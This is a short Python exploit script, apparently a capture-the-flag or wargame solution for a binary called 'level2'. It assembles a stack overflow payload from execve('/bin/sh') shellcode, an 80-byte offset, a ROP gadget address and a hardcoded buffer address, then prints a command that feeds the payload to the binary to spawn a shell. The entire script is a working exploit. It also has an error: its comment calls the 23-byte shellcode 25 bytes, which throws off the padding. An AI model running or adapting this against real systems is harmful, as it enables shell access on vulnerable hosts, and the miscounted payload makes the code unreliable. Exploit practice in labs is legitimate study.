#!/usr/bin/env python3
"""Level2: shellcode + offset + gadget + buffer address → command."""

try:
    from pwn import p32
except ImportError:
    def p32(x):
        return x.to_bytes(4, "little")

OFFSET = 80  # up to the return address
GADGET = 0x08048385   # pop ebx; ret
BUFFER_ADDR = 0xBFFFF6C0  # adjust in GDB (x/s after input)

# execve("/bin/sh") shellcode i386, no NUL
SHELLCODE = (
    "\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e"
    "\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80"
)

def main():
    # Shellcode above = 25 bytes
    padding_len = OFFSET - 25
    gadget_le = p32(GADGET)
    buf_le = p32(BUFFER_ADDR)
    buf_str = "".join("\\x%02x" % b for b in buf_le)
    gad_str = "".join("\\x%02x" % b for b in gadget_le)
    py = (
        f'print "{SHELLCODE}" + "A"*{padding_len} + "{gad_str}" + "{buf_str}"*2'
    )
    cmd = f"( python -c '{py}'; cat ) | ./level2"
    print(cmd)
    print("# offset =", OFFSET, ", gadget =", hex(GADGET), ", buffer =", hex(BUFFER_ADDR))

if __name__ == "__main__":
    main()
